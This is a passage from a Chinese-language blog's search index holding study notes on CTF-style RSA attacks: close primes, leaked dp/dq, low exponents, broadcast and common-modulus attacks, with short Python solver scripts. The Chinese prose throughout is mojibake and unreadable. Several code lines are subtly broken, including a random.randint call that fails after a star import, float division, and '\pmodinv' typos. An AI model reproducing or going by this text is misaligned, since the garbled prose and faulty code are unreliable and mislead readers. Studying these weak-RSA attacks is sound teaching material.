<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ RSAçš„ä¸€äº›å¥—è·¯</title>
      <link href="/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%97%E8%B7%AF/"/>
      <url>/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%97%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><del>å’•äº†å¿«åŠå¹´233333</del></p><p>è¿™é‡Œæ˜¯RSAæœ€æœ€åŸºç¡€çš„ï¼Œä¹Ÿæ˜¯æœ€æœ€å¸¸è§„çš„åˆ©ç”¨ï¼Œéƒ½æ˜¯ç”±äºå¯¹ç®—æ³•çš„ä¸æ­£ç¡®ä½¿ç”¨è€Œé€ æˆçš„ï¼Œcoppersmithç›¸å…³çš„attackè¯·ç§»æ­¥<a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ Coppersmithâ€™s Method</a></p><h1 id="è§£å¯†ç®—æ³•æ­£ç¡®æ€§çš„è¯æ˜"><a href="#è§£å¯†ç®—æ³•æ­£ç¡®æ€§çš„è¯æ˜" class="headerlink" title="è§£å¯†ç®—æ³•æ­£ç¡®æ€§çš„è¯æ˜"></a>è§£å¯†ç®—æ³•æ­£ç¡®æ€§çš„è¯æ˜</h1><p>é¦–å…ˆä»è§£å¯†ç®—æ³•çš„æ­£ç¡®æ€§è¯æ˜èµ·æ‰‹ï¼Œå³è¯æ˜$m \equiv c^d \pmod n$</p><p>æ¬§æ‹‰å®šç†ï¼šè‹¥$a,n$ä¸ºæ­£æ•´æ•°ï¼Œä¸”$ğ‘,ğ‘›$äº’ç´ ï¼ˆå³$gcd(a,n) = 1$ï¼‰ï¼Œåˆ™$ğ‘^{ğœ‘(ğ‘›)} \equiv 1 \pmod n$ã€‚<br>å·²çŸ¥ $1 \equiv e\cdot d \pmod {Ï†(n)}ï¼Œğ‘š &lt; ğ‘›ï¼Œc \equiv  m^e \pmod nï¼Œgcd(ğ‘š,ğ‘›) = 1$ï¼Œæ±‚è¯$m \equiv c^d \pmod n$ </p><p>ç­‰å¼å·¦è¾¹ä¸ºm</p><p>ç­‰å¼å³è¾¹ä¸º$c^d \pmod{n}$<br>âˆµ $ğ‘ \equiv m^e\pmod n $$</p><p>âˆ´ $c^d \pmod n \equiv  (m^e \pmod n)^d \pmod n \equiv  m^{e\cdot d} \pmod n $</p><p>âˆµ $1 \equiv  e\cdot d \pmod {Ï†(n)} $</p><p>âˆ´ $e\cdot d \equiv  k\cdot Ï†(n) + 1 $</p><p>âˆ´ $c^d  \equiv  m^{e \cdot d}  \equiv m^{k\cdot Ï†(n)+1}  \equiv  m\cdot (m^{Ï†(n)})^k \pmod n $</p><p>âˆµ $gcd(m,n) \equiv  1$</p><p> âˆ´ $m^{Ï†(n)} \equiv  1 \pmod n $</p><p>âˆ´ $c^d  \equiv  m\cdot (m^{Ï†(n)})^k \equiv  m\cdot (1)^k \equiv  m \pmod n $</p><p>âˆµ $m&lt;n$</p><p> âˆ´ $m \pmod n \equiv  m$</p><p> âˆ´ $c^d \equiv  m \pmod n \equiv  m $</p><p>ç­‰å¼å³è¾¹ç­‰äºç­‰å¼å·¦è¾¹ï¼Œè¯æ¯•ã€‚</p><hr><h1 id="på’Œqç›¸å·®è¿‡å°"><a href="#på’Œqç›¸å·®è¿‡å°" class="headerlink" title="på’Œqç›¸å·®è¿‡å°"></a>på’Œqç›¸å·®è¿‡å°</h1><p>å¦‚æœé¢˜ç›®ä»£ç ç»™åˆ°$p = nextprime(q)$è¿™æ ·</p><p>é‚£ä¹ˆè¯´æ˜$p$å’Œ$q$ç‰¹åˆ«æ¥è¿‘ï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä½œ$n  = p^2$</p><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¯¹$n$å¼€æ–¹å°±å¯ä»¥å¾—åˆ°$pã€q$ä¹‹é—´çš„ä¸€ä¸ªå€¼$t$ï¼Œè¿›è€Œæ±‚ä¸€ä¸ª$nextprime(t)$å³å¯å¾—åˆ°$p$</p><h1 id="æ¨¡næœ‰å…¬çº¦æ•°"><a href="#æ¨¡næœ‰å…¬çº¦æ•°" class="headerlink" title="æ¨¡næœ‰å…¬çº¦æ•°"></a>æ¨¡næœ‰å…¬çº¦æ•°</h1><p>åˆ©ç”¨æ¬§å‡ é‡Œå¾—è¾—è½¬ç›¸é™¤æ³•ï¼ˆ$gcd$ï¼‰å³å¯å¾—åˆ°$n$çš„å…¬çº¦æ•°</p><h1 id="å·²çŸ¥e-d-nåˆ†è§£æ¨¡æ±‚p-q"><a href="#å·²çŸ¥e-d-nåˆ†è§£æ¨¡æ±‚p-q" class="headerlink" title="å·²çŸ¥e,d,nåˆ†è§£æ¨¡æ±‚p,q"></a>å·²çŸ¥e,d,nåˆ†è§£æ¨¡æ±‚p,q</h1><p>åŸç†æ¥è‡ªè¿™ç¯‡<a href="https://www.ams.org/notices/199902/boneh.pdf" target="_blank" rel="noopener">ç»¼è¿°</a></p><p>ç»™å®š$d$ï¼Œè®¡ç®—$k=d\cdot eâˆ’1$ã€‚æ ¹æ®$d$å’Œ$e$çš„å®šä¹‰æˆ‘ä»¬çŸ¥é“$k$æ˜¯$Ï†(N)$çš„å€æ•°ã€‚ç”±äº$Ï†(N)$æ˜¯å¶æ•°ï¼Œ$k=2^tr$å…¶ä¸­$r$ä¸ºå¥‡æ•°ä¸”$tâ‰¥1$ã€‚å¯¹äºæ¯ä¸ª$g\in \mathbb{Z_n}$éƒ½æœ‰$g^k=1$ï¼Œå› æ­¤$g^{\frac{k}{2}}$æ˜¯å•ä½æ¨¡$N$çš„å¹³æ–¹æ ¹ã€‚æ ¹æ®ä¸­å›½å‰©ä½™å®šç†ï¼Œ1åœ¨æ¨¡$N$ä¸‹æœ‰å››ä¸ªå¹³æ–¹æ ¹ã€‚å…¶ä¸­ä¸¤ä¸ªå¹³æ–¹æ ¹æ˜¯$Â±1$ï¼Œå¦å¤–ä¸¤ä¸ªæ˜¯$Â±x$ï¼Œå…¶ä¸­xæ»¡è¶³$x\equiv 1 \pmod p$å’Œ$x\equiv âˆ’1 \pmod q$ã€‚ç”¨è¿™æœ€åä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œé€šè¿‡è®¡ç®—$gcd(xâˆ’1,N)$æ¥æ­ç¤º$N$çš„å› å¼åˆ†è§£ã€‚ä¸€ä¸ªç›´æˆªäº†å½“çš„è®ºè¯è¡¨æ˜ï¼Œå¦‚æœä»$\mathbb{Z_n}$ä¸­éšæœºé€‰æ‹©$g$ï¼Œé‚£ä¹ˆåºåˆ—ä¸­çš„ä¸€ä¸ªå…ƒç´ $g^{\frac{k}{2}}ï¼Œg^{\frac{k}{4}},â€¦ï¼Œg^{\frac{k}{2^t}} \pmod N$æ˜¯ç»Ÿä¸€å¹³æ–¹æ ¹çš„æ¦‚ç‡è‡³å°‘ä¸º$\frac{1}{2}$ï¼Œä»è€Œæ­ç¤ºäº†$N$çš„åˆ†è§£ï¼Œåºåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ å¯ä»¥åœ¨æ—¶é—´$O(n^3))$å†…æœ‰æ•ˆåœ°è®¡ç®—ï¼Œå…¶ä¸­$n=log_2N$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n_with_ed</span><span class="params">(n,e,d)</span>:</span>  </span><br><span class="line">    p = <span class="number">1</span>  </span><br><span class="line">    q = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:  </span><br><span class="line">        k = d * e - <span class="number">1</span>  </span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            y = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)  </span><br><span class="line">                q = n/p  </span><br><span class="line">    <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h1 id="d-pã€d-q-æ³„éœ²"><a href="#d-pã€d-q-æ³„éœ²" class="headerlink" title="$d_pã€d_q$æ³„éœ²"></a>$d_pã€d_q$æ³„éœ²</h1><p>æ‘˜è‡ªè¿™ç¯‡<a href="https://code.felinae98.cn/ctf/crypto/rsa%E7%A7%81%E9%92%A5%E9%87%8D%E6%9E%84/" target="_blank" rel="noopener">ç§é’¥é‡æ„</a></p><p>é¦–å…ˆè¯´æ˜$d_p$å’Œ$d_q$çš„å«ä¹‰</p><p>$d_p \equiv d \pmod{Ï†(p)}$<br>$d_q \equiv d \pmod{Ï†(q)}$</p><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥$pï¼Œqï¼Œd_pï¼Œd_qï¼Œc$ï¼Œæ— å…¬é’¥$e$ã€ç§é’¥$d$</p><p>è¯ï¼š</p><p>ç”±    $e\cdot d  \equiv 1 \pmod {(p-1)\cdot (q-1)}$</p><p>â€‹        $d_p \equiv d \pmod{Ï†(p)}$</p><p>å¾—    $e\cdot d_p \equiv  1 \pmod {Ï†(p)} $</p><p>è®¾$m_1  \equiv  m^{e\cdot d_p}  \equiv  c^{d_p} \pmod p$</p><p>åˆ™$m_1 \equiv  m^{k\cdot Ï†(p)+1} \pmod p $</p><p>ç”±è´¹é©¬å°å®šç†ï¼Œ$m^{Ï†(p)}  \equiv 1 \pmod p$</p><p>æ‰€ä»¥$ m_1  \equiv  m \pmod p$</p><p>åŒç† $m_2  \equiv  m  \equiv c^{d_q} \pmod q$</p><p>ç„¶åæˆ‘ä»¬å°±æœ‰åŒä½™å¼æ–¹ç¨‹ç»„ï¼š$m  \equiv  m_1  \pmod p$</p><p>â€‹                                                   $m  \equiv  m_2  \pmod q$</p><p>ç„¶åèµ°ä¸€æ³¢CRTæ¢å¤$m$å°±å¥½äº†ï¼ˆ$m &lt; p\cdot q$ï¼‰</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mp = pow(c,dp,p)</span><br><span class="line">mq = pow(c,dq,q)</span><br><span class="line">a = invert(p,q)</span><br><span class="line">b = invert(q,p)</span><br><span class="line">m = (mp*p*a+mq*q*b) % (p*q)</span><br></pre></td></tr></table></figure><h1 id="d-p-æ³„éœ²"><a href="#d-p-æ³„éœ²" class="headerlink" title="$d_p$æ³„éœ²"></a>$d_p$æ³„éœ²</h1><p>å·²çŸ¥ï¼šå…¬é’¥($n,e)$ä»¥åŠ$d_p$</p><p>æ±‚è§£ï¼š$d$</p><p>å·²çŸ¥æ¡ä»¶ï¼š</p><p>$c\equiv m^e \pmod n$<br>$m\equiv c^d \pmod n$<br>$Ï†(n)=(pâˆ’1)\cdot (qâˆ’1)$<br>$d\cdot e\equiv 1 \pmod {Ï†(n)}$</p><p>$d_p\equiv d \pmod {pâˆ’1}$</p><p> ç”±ä¸Šå¼å¯ä»¥å¾—åˆ°       $d_p\cdot e\equiv d\cdot e  \pmod {pâˆ’1}$</p><p>å³                                $d\cdot e = k_1\cdot (pâˆ’1)+d_p\cdot e$        â‘ </p><p>åˆ                                $d\cdot e\equiv 1 \pmod {(pâˆ’1)\cdot (qâˆ’1)}$            â‘¡</p><p>â‘ å¸¦å…¥â‘¡å¾—åˆ°ï¼š        $k_1\cdot (pâˆ’1)+d_p\cdot e \equiv  1\pmod { (pâˆ’1)\cdot (qâˆ’1)}$</p><p>å³                          $k_2\cdot (pâˆ’1)\cdot (qâˆ’1)+1=k_1\cdot (pâˆ’1)+d_p\cdot e$</p><p>æ•´ç†ä¸€ä¸‹    $(pâˆ’1)\cdot [k_2\cdot (qâˆ’1)âˆ’k_1]+1=d_p\cdot e$</p><p>å› ä¸º                                              $ d_p&lt;p-1$</p><p>æ‰€ä»¥                                        $e&gt;k_2\cdot (qâˆ’1)âˆ’k_1$</p><p>æˆ‘ä»¬å‡è®¾    $x = k_2\cdot (qâˆ’1)âˆ’k_1$</p><p>å³$    x$çš„èŒƒå›´ä¸º$(0,e)$</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥éå†$e$ç§å¯èƒ½å°±å¯ä»¥æ±‚å‡º$p-1 = \frac{d_p\cdot e -1} {x}$ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_nedp</span><span class="params">(n,e,dp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"><a href="#ä½åŠ å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</h1><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œæ— éå°±æ˜¯åŠ å¯†æŒ‡æ•°$e$çš„é€‰å–å¤ªå°äº†ï¼Œå¯¼è‡´$m^e&lt;n$ï¼Œè¿™ä¸ªæ—¶å€™æ ¹æœ¬æ²¡æœ‰è§¦å‘æ¨¡è¿ç®—ï¼Œæ‰€ä»¥ç›´æ¥å¯¹$c$å¼€$e$æ¬¡æ ¹å°±å¥½äº†ã€‚ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾å°±æ˜¯cçš„bitä½æ•°è¿œå°äºnçš„bitä½æ•°ã€‚</p><h1 id="eä¸Ï†-n-ä¸äº’ç´ "><a href="#eä¸Ï†-n-ä¸äº’ç´ " class="headerlink" title="eä¸Ï†(n)ä¸äº’ç´ "></a>eä¸Ï†(n)ä¸äº’ç´ </h1><p>æƒ…å†µåˆ†å‡ ç§å­ï¼Œ</p><h2 id="m-gcd-e-phi-lt-n"><a href="#m-gcd-e-phi-lt-n" class="headerlink" title="m^gcd(e,phi) &lt; n"></a>m^gcd(e,phi) &lt; n</h2><p>è¿™ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæœ‰ç‚¹ç®—æ˜¯ä½åŠ å¯†æŒ‡æ•°æ”»å‡»çš„å˜å‹</p><p>åŸæ¥æˆ‘ä»¬çš„åŠ å¯†å…¬å¼æ˜¯$c \equiv m^e \pmod n $</p><p>ç°è®¾$t = gcd(e,phi)$</p><p>é‚£ä¹ˆåŠ å¯†å…¬å¼å˜ä¸º$c \equiv m^{\hat e<em>t} \pmod n $ï¼Œå…¶ä¸­$\hat e</em>t = e$</p><p>æ˜¾ç„¶æ­¤æ—¶$gcd(\hat e ,phi) =1$</p><p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨$\hat e ,phi$ç®—å‡ºçš„ç§é’¥$\hat d$è¿›è¡Œè§£å¯†ï¼Œæ±‚å‡º$m^t$</p><p>ç„¶åç”±äº$m^t&lt;n$ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹$m^t$å¼€$t$æ¬¡æ ¹å°±å¥½äº†ã€‚</p><h2 id="e-2"><a href="#e-2" class="headerlink" title="e=2"></a>e=2</h2><p>å¥½å®¶ä¼™ï¼Œe=2ä¹Ÿå°±æ„å‘³ç€ä¸Šå¼ä¸­çš„$\hat e$å°±ç­‰äº1äº†ï¼Œæ²¡å•¥æ„ä¹‰äº†ã€‚</p><p>e=2è¿™ç§ç‰¹æ®Šæƒ…å†µå¯¹åº”ç€çš„æ˜¯rabinå¯†ç ç³»ç»Ÿï¼Œå…·ä½“åŸç†å¯ç§»æ­¥<a href="https://jayxv.github.io/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/">å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æ•°è®ºå››å¤§å®šç†åŠåº”ç”¨</a></p><h2 id="e-2-amp-amp-e-phi"><a href="#e-2-amp-amp-e-phi" class="headerlink" title="e != 2 &amp;&amp; e | phi"></a>e != 2 &amp;&amp; e | phi</h2><p>è¿™é‡Œè¦æ±‚çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œä½ éœ€è¦çŸ¥é“$n$çš„åˆ†è§£$p,q$ç„¶åå†åœ¨æ¨¡$p,q$ä¸‹å¯¹$c$å¼€$e$æ¬¡æ ¹ï¼Œä¹Ÿå³åŸŸä¸‹å¼€æ ¹ï¼Œç°å­˜æœ‰ä¸€äº›ç®—æ³•å¯ä»¥åšåˆ°ï¼Œæ¯”è¾ƒæœ‰æ•ˆçš„æ˜¯AMMï¼Œæˆ‘<a href="https://jayxv.github.io/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/">è¿™ç¯‡æ–‡ç« </a>ç»™çš„æ˜¯å¦ä¸€ç§ç®—æ³•ï¼Œç¨å¾®éº»çƒ¦äº›ï¼Œè¦åˆ†ç±»è®¨è®ºã€‚æœ€åå¦‚æœ$m&gt;pï¼Œ m&gt;q$çš„è¯è¿˜è¦CRTä¸€æ³¢ï¼Œè§£é›†å¤§å°æ˜¯$gcd(e,p-1)*gcd(e,q-1)$ã€‚å¯¹åº”é¢˜ç›®å¯å‚è€ƒ<a href="http://www.soreatu.com/posts/intended-solution-to-crypto-problems-in-nctf-2019/#easyrsa909pt-2solvers" target="_blank" rel="noopener">2019NCTF-EASYRSA</a></p><h1 id="å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ"><a href="#å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ" class="headerlink" title="å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ"></a>å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ</h1><p>å› å­è¶Šå¤šï¼ŒåŒç­‰é•¿åº¦$n$çš„æƒ…å†µä¸‹è¶Šå®¹æ˜“åˆ†è§£ã€‚ï¼ˆæ‰€ä»¥å¦‚æœ$n$é•¿åº¦æ¯”è¾ƒçŸ­ï¼Œå› å­åˆè¢«æ˜¾ç¤ºåœ°è¯´æ˜æœ‰å¾ˆå¤šï¼Œå¯ä»¥è¯•è¯•yafuï¼‰</p><p>ä¸æ­£å¸¸è§£å¯†RSAæ— å¼‚ã€‚æ ¹æ®å®šä¹‰æ±‚$Ï†(n)$å°±å¥½ã€‚</p><h1 id="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"><a href="#ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»</h1><p>æ»¡è¶³æ¡ä»¶ï¼š$m.bit_length*e &lt; \prod c.bit_length    $</p><p>mï¼Œeç›¸åŒï¼Œä¸åŒçš„æ˜¯cå’Œnï¼Œæœ‰ï¼š<br>$c_1 \equiv m^e \pmod {n_1}$<br>$c_2 \equiv m^e \pmod {n_2}$<br>$c_3 \equiv m^e \pmod {n_3}$<br>â€¦<br>$c_n \equiv m^e \pmod {n_n}$ </p><p>CRTå¯ä»¥å¾—åˆ°</p><p> $c \equiv m^e \pmod {n_1n_2n_3\cdot\cdot\cdot n_n}$ </p><p>å½“$c &lt; n_1n_2n_3\cdot\cdot\cdot n_n$æ—¶ï¼Œä¸Šé¢å°±å¯ä»¥æ”¹æˆç­‰å¼äº†</p><p>ç„¶åç›´æ¥å¼€ä¸€æ‰‹æ ¹ï¼Œç»“æŸã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =  []</span><br><span class="line">c =  []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">e=<span class="number">0x7</span></span><br><span class="line">m=iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h1><p>å·²çŸ¥ï¼šè‹¥å¹²æ¬¡åŠ å¯†ä¸­ä½¿ç”¨äº†ç›¸åŒçš„æ¨¡nå’Œä¸åŒçš„å…¬é’¥eå¯¹åŒä¸€æ˜æ–‡mè¿›è¡Œäº†å¤šæ¬¡åŠ å¯†å¹¶ä¸”<strong>ç»™å‡ºäº†å¯¹åº”å¯†æ–‡</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸å¾—åˆ°ç§é’¥çš„å‰æä¸‹ï¼Œè§£å‡ºæ˜æ–‡mã€‚</p><p>é¦–å…ˆï¼Œéœ€è¦ä¸¤ä¸ªåŠ å¯†æŒ‡æ•°äº’è´¨ï¼š<br>$gcd(e_1,e_2)=1$</p><p>å³å­˜åœ¨$s_1$å’Œ$s_2$ä½¿å¾—ï¼š<br>$s_1\cdot e_1+s_2\cdot e_2=1$</p><p>åˆå› ä¸ºï¼š<br>$c_1\equiv m^{e_1} \pmod n$<br>$c_2\equiv m^{e_2} \pmod n$</p><p>ä¸¤æ¡å¼å­åˆ†åˆ«æ±‚ä¸€ä¸ª$s_1,s_2$æ¬¡æ–¹ç„¶åç›¸ä¹˜ï¼ŒåŒ–ç®€å¯å¾—ï¼š<br>$c_1^{s_1} \cdot  c_2^{s_2} \equiv  m^{e\cdot s_1} \cdot m^{e\cdot s_2} \equiv m^{e\cdot s_1+e\cdot s_2} \equiv m \pmod n$</p><p>å³å¯æ±‚å‡ºæ˜æ–‡</p><p>exp:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">a</span> == <span class="number">0</span>:</span><br><span class="line">      return (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, <span class="attr">x</span> = egcd(b % a, a)</span><br><span class="line">      return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, <span class="attr">y</span> = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      raise Exception('\pmodular inverse does not exist')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      return x % m</span><br><span class="line"></span><br><span class="line"><span class="attr">c1=</span></span><br><span class="line"><span class="attr">n=</span></span><br><span class="line"><span class="attr">e1=0xc21000af014a98b2455dec479</span></span><br><span class="line"><span class="attr">c2=</span></span><br><span class="line"><span class="attr">e2=0x9935842d63b75899ddd81b467</span></span><br><span class="line"></span><br><span class="line"><span class="attr">s</span> = egcd(e1, e2)</span><br><span class="line"><span class="attr">s1</span> = s[<span class="number">1</span>]</span><br><span class="line"><span class="attr">s2</span> = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s1</span> = - s1</span><br><span class="line">   <span class="attr">c1</span> = \pmodinv(c1, n)</span><br><span class="line">elif s2&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s2</span> = - s2</span><br><span class="line">   <span class="attr">c2</span> = \pmodinv(c2, n)</span><br><span class="line"><span class="attr">m=(pow(c1,s1,n)*pow(c2,s2,n))</span> % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h1 id="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»-1"><a href="#ä½åŠ å¯†æŒ‡æ•°æ”»å‡»-1" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</h1><h2 id="è¿åˆ†æ•°çŸ¥è¯†ç›¸å…³"><a href="#è¿åˆ†æ•°çŸ¥è¯†ç›¸å…³" class="headerlink" title="è¿åˆ†æ•°çŸ¥è¯†ç›¸å…³"></a>è¿åˆ†æ•°çŸ¥è¯†ç›¸å…³</h2><p>ç›¸å…³ç†è®ºçŸ¥è¯†ç™¾åº¦ç™¾ç§‘å°±æœ‰ï¼Œè¿™é‡Œç›´æ¥ä¸Šè¿‡ç¨‹ï¼ŒæŒºå¥½æ‡‚å¾—ã€‚</p><p><img src="https://i.loli.net/2020/12/18/qwbjNIno1CluT5p.jpg" alt="img"></p><p>è¿åˆ†æ•°å°±æ˜¯ç”¨åˆ†æ•°å»è¡¨ç¤ºä¸€ä¸ªå°æ•°å­ã€‚å¦‚æœæ˜¯ä¸ªæ— é™ä¸å¾ªç¯å°æ•°ï¼Œé‚£ä¹ˆè¿åˆ†æ•°å°±ä¼šæ— é™å¾—å»é€¼è¿‘å®ƒã€‚å¦‚æœä¸æ˜¯æ— 